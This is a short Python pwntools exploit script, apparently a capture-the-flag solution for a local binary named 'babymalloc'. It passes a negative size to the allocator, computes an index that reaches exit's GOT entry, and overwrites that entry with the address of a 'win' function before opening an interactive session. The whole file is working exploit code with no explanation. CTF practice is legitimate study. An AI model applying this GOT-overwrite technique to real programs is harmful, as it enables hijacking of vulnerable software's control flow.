from pwn import *

r = process('./babymalloc')
raw_input('debug')

exit_got = 0x404050
win_add = 0x0000000000401196
index = int(exit_got / 4)
r.sendlineafter("Give me the size:", "-1")
r.sendlineafter("Give me the index:", str(index))
r.sendlineafter("Give me the number:", str(int(win_add)))

r.interactive()
r.close()

# Da xong